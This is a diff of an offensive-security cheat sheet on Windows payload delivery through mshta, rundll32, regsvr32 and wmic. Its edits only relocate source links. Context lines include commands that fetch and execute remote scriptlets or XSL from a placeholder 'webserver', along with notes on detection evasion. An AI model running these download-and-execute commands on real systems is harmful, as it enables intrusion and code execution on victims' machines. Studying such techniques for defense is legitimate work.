@@ -144,6 +144,8 @@ Payload written on disk: **WebDAV client local cache**
 
 #### hta example
 
+[**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+
 ```markup
 <html>
 <head>
@@ -159,9 +161,11 @@ Payload written on disk: **WebDAV client local cache**
 </html>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+
 
 #### **mshta - sct**
+
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 ```markup
 <?XML version="1.0"?>
@@ -179,7 +183,6 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Mshta - Metasploit**
 
@@ -218,6 +221,8 @@ Payload written on disk: **IE local cache**
 
 **Rundll32 - sct**
 
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+
 ```bash
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -232,8 +237,6 @@ Payload written on disk: **IE local cache**
 </script>
 </scriptlet>
 ```
-
-**Extracted from** [**here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
 #### **Rundll32 - Metasploit**
 
@@ -274,6 +277,8 @@ Payload written on disk: **WebDAV client local cache**
 
 #### Regsvr32 -sct
 
+[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+
 ```markup
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -291,7 +296,7 @@ Payload written on disk: **WebDAV client local cache**
 </scriptlet>
 ```
 
-**Extracted from** [**here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+
 
 #### **Regsvr32 - Metasploit**
 
@@ -391,7 +396,7 @@ wmic os get /format:"https://webserver/payload.xsl"
 Process performing network call: **wmic.exe**\
 Payload written on disk: **IE local cache**
 
-Example xsl file:
+Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 
 ```
 <?xml version='1.0'?>
@@ -404,8 +409,6 @@ Example xsl file:
     </ms:script>
 </stylesheet>
 ```
-
-Extracted from [here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
 
 **Not detected**
 
